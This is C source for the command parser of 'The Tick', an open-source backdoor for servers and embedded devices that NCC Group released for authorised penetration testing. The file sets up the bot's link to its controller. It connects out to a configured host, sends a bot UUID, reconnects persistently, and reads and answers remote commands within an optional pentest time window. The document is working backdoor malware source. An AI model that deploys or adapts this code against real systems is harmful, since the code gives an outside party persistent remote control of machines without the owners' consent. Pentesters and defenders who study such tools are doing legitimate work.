/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "parser.h"

#include "command.h"
#include "shell.h"
#include "tcp.h"
#include "uuid4.h"

// Initialize the parser.
void parser_init(Parser *parser, const Settings *settings)
{
    if (is_empty(settings->uuid, sizeof(settings->uuid))) {
        uuid4((unsigned char *) parser->uuid);
    } else {
        memcpy(parser->uuid, settings->uuid, sizeof(parser->uuid));
    }
#if TICK_VERBOSE
    char uuid_str[39];
    if (uuid_encode((unsigned char *) parser->uuid, uuid_str, sizeof(uuid_str)) == 0) {
        LOG("Instance ID: %s\n", uuid_str);
    }
#endif
    memcpy(parser->hostname, settings->hostname, sizeof(parser->hostname));
    parser->port = settings->port;
    parser->fd = -1;
    parser->retries = TICK_CONNECT_RETRY_TIMES + 1;
    parser->connected_at = 0;
#if TICK_FEATURES_CRYPTO
    parser->use_ssl = settings->use_ssl;
    memset(&parser->ssl, 0, sizeof(parser->ssl));
#endif
    parser->header.cmd_id = 0;
    parser->header.cmd_len = 0;
    parser->header.data_len = 0;
    memset(parser->buffer, 0, sizeof(parser->buffer));

#if TICK_FEATURES_TIME_LIMIT
    parser->start_time = settings->start_time;
    parser->end_time = settings->end_time;

    // If the time limit feature is enabled but both values
    // are zero, just ignore the following code.
    if (parser->start_time > 0 || parser->end_time > 0) {

        // If the end date is before the start date, that probably
        // means the user made a mistake. Fix it.
        if (parser->end_time > 0 && parser->end_time < parser->start_time) {
            LOG("Warning: start and end times are swapped!\n");
            parser->end_time = settings->start_time;
            parser->start_time = settings->end_time;
        }

        // Get the current time.
        time_t now = time(NULL);

        // If the start and end times are the same, this is clearly
        // a user error. Try to guess which one is correct.
        if (parser->start_time == parser->end_time) {
            LOG("Warning: pentest time is zero! Guessing the time window...\n");
            if (parser->start_time > now) {
                parser->start_time = 0;
            } else {
                parser->end_time = 0;
            }
        }

        // If logging is enabled, tell what the time limits are.
#if TICK_VERBOSE
        char start_str[80];
        char end_str[80];
        if (parser->start_time > 0) {
            struct tm start_tm;
            start_tm = *localtime(&parser->start_time);
            strftime(start_str, sizeof(start_str), "%a %Y-%m-%d %H:%M:%S %Z", &start_tm);
        } else {
            strcpy(start_str, "any time");
        }
        if (parser->end_time > 0) {
            struct tm end_tm;
            end_tm = *localtime(&parser->end_time);
            strftime(end_str, sizeof(end_str), "%a %Y-%m-%d %H:%M:%S %Z", &end_tm);
        } else {
            strcpy(end_str, "forever");
        }
        LOG("Time limits for this pentest have been set.\n"
            "  Start date: %s\n"
            "    End date: %s\n",
            start_str, end_str);
#endif

        // If we have a pentesting window, check it now.
        // This will literally wait until the start date arrives.
        // We can't just quit and have the user start the bot again,
        // because persistence on the device may not be guaranteed.
        // It will quit with an error if the end time has passed.
        if (now < parser->start_time) {
            time_t delta = parser->start_time - now;
            LOG("Start time has not yet arrived, waiting for %ld seconds...\n",
                (unsigned long int) delta);
            sleep(delta);
        } else if (parser->end_time > 0 && now >= parser->end_time) {
            LOG("End time has already passed, the pentest is over!\n");
            exit(1);        // kill the current process
        }
    } else {
        LOG("No pentesting window has been set, bot will run forever.\n");
    }
#endif
}

// Closes the file descriptor and resets some internal variables.
void parser_close(Parser *parser)
{
    if (parser->fd >= 0) {
        shutdown(parser->fd, 2);    // SHUT_RDWR / SD_BOTH: shut down abruptly
        close(parser->fd);
    }
    parser->fd = -1;
#if TICK_FEATURES_CRYPTO
    memset(&parser->ssl, 0, sizeof(parser->ssl));
#endif
    parser->header.cmd_id = 0;
    parser->header.cmd_len = 0;
    parser->header.data_len = 0;
    memset(&parser->buffer, 0, sizeof(parser->buffer));
}

// Send a command response header. Data should be sent by the caller.
int parser_begin_response(Parser *parser, uint8_t status, uint32_t length)
{
    RESP_HEADER resp;

    resp.status = status;
    resp.data_len = htonl(length);
    return parser_send_block(parser, (const char *) &resp, sizeof(resp));
}

// Send an empty success response.
// We reset the retry counter here, because at this point we
// must have managed to parse at least one command succesfully.
int parser_ok(Parser *parser)
{
    int r = parser_begin_response(parser, CMD_STATUS_OK, 0);
    if (r == 0) {
        parser->retries = TICK_CONNECT_RETRY_TIMES + 1;
        parser->connected_at = time(NULL);
    }
    return r;
}

// Send an error response.
// We also reset the retry counter here.
int parser_error(Parser *parser, const char *error)
{
    uint16_t length = 0;
    if (error != NULL) {
        length = (uint16_t) strlen(error);
        if (length != strlen(error)) {
            length = 0;
        }
    }
    int r = parser_begin_response(parser, CMD_STATUS_ERROR, length);
    if (r == 0 && length > 0) {
        r = parser_send_block(parser, error, length);
    }
    if (r == 0) {
        parser->retries = TICK_CONNECT_RETRY_TIMES + 1;
        parser->connected_at = time(NULL);
    }
    return r;
}

// Test to see if the socket is connected.
int parser_is_connected(Parser *parser)
{
    return (parser->fd >= 0 && send(parser->fd, NULL, 0, MSG_NOSIGNAL) == 0);
}

// If not conected, connects the socket. If connected, does nothing.
void parser_connect(Parser *parser)
{
    // Do nothing if we're already connected.
    if ( ! parser_is_connected(parser) ) {

        // Close the old socket and reset internal variables.
        parser_close(parser);

        // Connect retry loop.
        while (parser->fd < 0) {

            // Count the number of retries, exit if we ran out of tries.
#if TICK_CONNECT_RETRY_TIMES >= 0
            if (parser->retries > 0) parser->retries--;
            else if (parser->retries == 0) {
                LOG("Error connecting, quitting after %d retries\n", TICK_CONNECT_RETRY_TIMES);
                break;
            }
#endif

            // Throttle the number of connection attempts.
#if TICK_CONNECT_RETRY_PAUSE > 0
            if (parser->connected_at != 0) {
                time_t ago = time(NULL) - parser->connected_at;
                if (ago < TICK_CONNECT_RETRY_PAUSE) {
                    LOG("Error connecting, waiting %d seconds to retry...\n", TICK_CONNECT_RETRY_PAUSE);
                    sleep(TICK_CONNECT_RETRY_PAUSE);
                } else {
                    LOG("Last connection attempt was %ld seconds ago, no pause is needed.\n", (long int) ago);
                }
            }
            parser->connected_at = time(NULL);
#endif

            // Connect to the given hostname and port.
#if TICK_FEATURES_CRYPTO
            if (parser->use_ssl) {
                parser->fd = -1;
                LOG("Connecting to %s:%d (SSL)...\n", parser->hostname, parser->port);
                ssl_connect_to_host(&parser->ssl, &parser->fd, parser->hostname, parser->port);
            } else {
                LOG("Connecting to %s:%d (plaintext)...\n", parser->hostname, parser->port);
                parser->fd = connect_to_host(parser->hostname, parser->port);
            }
#else
            LOG("Connecting to %s:%d...\n", parser->hostname, parser->port);
            parser->fd = connect_to_host(parser->hostname, parser->port);
#endif

            // Send the bot ID immediately after a successful (re)connection.
            // If this fails, treat it exactly like a TCP connection error.
            if (parser->fd >= 0 && parser_send_block(parser, parser->uuid, sizeof(parser->uuid)) < 0) {
                parser_close(parser);
            }
            if (parser->fd >= 0) {
                LOG("Connected, socket is %d\n", parser->fd);
            }
        }

        // If reconnection is not possible, set a fake quit command.
        if (parser->fd < 0) {
            parser_close(parser);
            parser->header.cmd_id = CMD_SYSTEM_EXIT;
            parser->header.cmd_len = 0;
            parser->header.data_len = 0;
            return;
        }
    }
}

// Blocking call to wait for the next command.
// Will reconnect the socket automatically if needed.
void parser_wait(Parser *parser)
{
    // If we have a self destruct time, check it again now.
    // That way running bots will self destruct even when running for days.
    // If we only checked this on startup, we risk not checking at all!
#if TICK_FEATURES_TIME_LIMIT
    if (parser->end_time > 0 && time(NULL) >= parser->end_time) {
        LOG("End time has already passed, the pentest is over!\n");
        exit(1);        // kill the current process
    }
#endif

    // Reconnect automatically if needed.
    // If reconnection fails permanently, exit.
    parser_connect(parser);
    if ( ! parser_is_connected(parser) ) {
        parser_close(parser);
        parser->header.cmd_id = CMD_SYSTEM_EXIT;
        parser->header.cmd_len = 0;
        parser->header.data_len = 0;
        return;
    }

    // Read the command block header.
    // Drop and restart if the connection is interrupted.
    // If reconnection fails permanently, exit.
    for (;;) {
        memset((void *) &parser->header, 0, sizeof(parser->header));
        if (parser_recv_block(parser, (char *) &parser->header, sizeof(parser->header)) < 0) {
            parser_close(parser);
            parser_connect(parser);
            if ( ! parser_is_connected(parser) ) {
                parser_close(parser);
                parser->header.cmd_id = CMD_SYSTEM_EXIT;
                parser->header.cmd_len = 0;
                parser->header.data_len = 0;
                return;
            }
            continue;
        }
        break;
    }

    // Fix the endianness.
    parser->header.cmd_id = ntohs(parser->header.cmd_id);
    parser->header.cmd_len = ntohs(parser->header.cmd_len);
    parser->header.data_len = ntohl(parser->header.data_len);

    // Clean up the internal buffer.
    memset((void *) &parser->buffer, 0, sizeof(parser->buffer));
}

// Skip all extra data in the socket until the next command header.
void parser_next(Parser *parser)
{
    // If we are connected...
    if (parser_is_connected(parser)) {

        // Calculate how much unread data we have in the socket.
        size_t extra_data = (size_t) parser->header.cmd_len + (size_t) parser->header.data_len;

        // If we have unread data...
        if (extra_data > 0) {

            // Skip as many bytes as needed.
            int success = 0;
#if TICK_FEATURES_CRYPTO
            if (parser->use_ssl) {
                success = ssl_consume_extra_data(&parser->ssl, extra_data);
            } else {
                success = consume_extra_data(parser->fd, extra_data);
            }
#else
            success = consume_extra_data(parser->fd, extra_data);
#endif
            if (success < 0) {

                // On error, reconnect and reset internal variables.
                parser_connect(parser);

            } else {
                
                // On success, update the internal variables.
                parser->header.cmd_len = 0;
                parser->header.data_len = 0;

            }
        }

    // If we are not connected...
    } else {

        // Reconnect and reset internal variables.
        parser_connect(parser);
    }
}

// Read the first argument for the current command into an arbitrary buffer.
// Note that the argument IS NOT guaranteed to be null terminated!
// Returns 0 on success or -1 on error (and drops the connection).
int parser_read_first_arg(Parser *parser, char *buffer, size_t count)
{
    // Discard commands where the first argument is larger than the buffer size.
    if ((size_t) parser->header.cmd_len > count) {
        LOG("Error: first argument too long: %d > %d\n", (unsigned int) parser->header.cmd_len, (unsigned int) count);
        parser_error(parser, "first argument to long");
        return -1;
    }

    // Load the first argument into the buffer.
    // On error drop the connection.
    memset((void *) buffer, 0, count);
    if (parser_recv_block(parser, buffer, parser->header.cmd_len) < 0) {
        parser_close(parser);
        return -1;
    }

    // Update the internal counter.
    parser->header.cmd_len = 0;
    return 0;
}

// Read the second argument for the current command into an arbitrary buffer.
// Note that the argument IS NOT guaranteed to be null terminated!
// Returns 0 on success or -1 on error (and drops the connection).
int parser_read_second_arg(Parser *parser, char *buffer, size_t count)
{
    // Discard commands where the second argument is larger than the buffer size.
    if ((size_t) parser->header.data_len > count) {
        LOG("Error: second argument too long: %d > %d\n", (unsigned int) parser->header.data_len, (unsigned int) count);
        parser_error(parser, "second argument to long");
        return -1;
    }

    // Load the second argument into the buffer.
    memset((void *) buffer, 0, count);
    ssize_t bytes = parser_recv_block(parser, buffer, parser->header.data_len);

    // On error drop the connection.
    if (bytes < 0) {
        parser_close(parser);
        return -1;
    }

    // Update the internal counter.
    parser->header.data_len = 0;
    return 0;
}

// Read the first argument for the current command into our internal buffer.
// When using this function, the argument is guaranteed to be null terminated.
// Returns 0 on success or -1 on error (and drops the connection).
int parser_get_first_arg(Parser *parser)
{
    memset(parser->buffer, 0, sizeof(parser->buffer));
    return parser_read_first_arg(parser, (char *) &parser->buffer, sizeof(parser->buffer) - 1);
}

// Read the second argument for the current command into our internal buffer.
// When using this function, the argument is guaranteed to be null terminated.
// Returns 0 on success or -1 on error (and drops the connection).
int parser_get_second_arg(Parser *parser)
{
    memset(parser->buffer, 0, sizeof(parser->buffer));
    return parser_read_second_arg(parser, (char *) &parser->buffer, sizeof(parser->buffer) - 1);
}

// Sends a block of data as the response payload.
// Does not return until all data has been sent.
// Returns 0 on success or -1 if the connection was interrupted.
int parser_send_block(Parser *parser, const char *buf, size_t count)
{
    if (parser->fd < 0) {
        return -1;
    }
#if TICK_FEATURES_CRYPTO
    if (parser->use_ssl) {
        return ssl_send_block(&parser->ssl, buf, count);
    }
#endif
    return send_block(parser->fd, buf, count);
}

// Reads a block of data from a request.
// Does not return until all data has been read.
// Returns 0 on success or -1 if the connection was interrupted.
int parser_recv_block(Parser *parser, char *buf, size_t count)
{
    if (parser->fd < 0) {
        return -1;
    }
#if TICK_FEATURES_CRYPTO
    if (parser->use_ssl) {
        return ssl_recv_block(&parser->ssl, buf, count);
    }
#endif
    return recv_block(parser->fd, buf, count);
}
